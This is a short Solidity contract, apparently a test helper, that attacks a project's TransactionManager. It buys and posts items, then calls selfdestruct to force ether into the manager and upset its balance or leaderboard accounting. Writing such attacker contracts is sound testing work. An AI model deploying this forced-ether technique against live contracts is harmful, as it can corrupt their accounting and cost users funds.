// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {TransactionManager} from "../../src/TransactionManager.sol";

contract LeaderboardSelfDestructAttacker {
    TransactionManager tmgr;
    constructor(TransactionManager _tmgr) {
        tmgr = _tmgr;
    }
    function buy() public payable {
        tmgr.registerUser();
        tmgr.addBalance(150 ether);
        assert(tmgr.purchaseItem(1, 50 ether));
        assert(tmgr.purchaseItem(1, 50 ether));
        assert(tmgr.purchaseItem(1, 50 ether));

    }
    function post() public payable {
        tmgr.postItem(1, "ATTACKER", 5 ether, true);

    }
    function sell() public payable {
        tmgr.sellItem(1);
    }
    function attack() public payable {
        address payable addr = payable(address(tmgr));
        selfdestruct(addr);
    }
}